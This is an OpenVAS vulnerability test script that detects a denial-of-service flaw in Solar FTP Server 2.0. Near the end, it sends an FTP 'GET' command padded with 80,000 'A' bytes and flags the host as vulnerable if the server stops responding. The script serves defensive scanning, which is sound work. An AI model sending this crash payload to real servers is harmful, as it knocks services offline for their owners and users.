###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_solarftp_mult_cmds_dos_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# SolarFTP Server Multiple Commands Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash.
  Impact Level: Application";
tag_affected = "Solar FTP Server Version 2.0";
tag_insight = "The flaw is due to the way server handles certain commands 'APPE',
  'GET', 'PUT', 'NLST' and 'MDTM' along with long data causing Denial of
  Service.";
tag_solution = "No solution or patch is available as of 22nd December 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.solarftp.com/";
tag_summary = "This host is running Solar FTP Server and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(800190);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("SolarFTP Server Multiple Commands Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution + "


  ";
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15750/");
  script_description(desc);
  script_summary("Determine SolarFTP Server Vulnerable or Not");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

## Get the default FTP port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check FTP Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the application with FTP banner
banner = get_ftp_banner(port:ftpPort);
if("220 " >!< banner || "Solar FTP Server" >!< banner){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}
resp =  recv_line(socket:soc, length:100);

## Construct and send attack request
attack = string("GET ", crap(data: raw_string(0x41), length: 80000), "\r\n");
send(socket:soc, data:attack);
resp = recv_line(socket:soc, length:260);

## Check the response, Server crashed if no response
if(!resp)
{
  security_hole(port:ftpPort);
  exit(0);
}

## Close FTP socket
ftp_close(socket:soc);
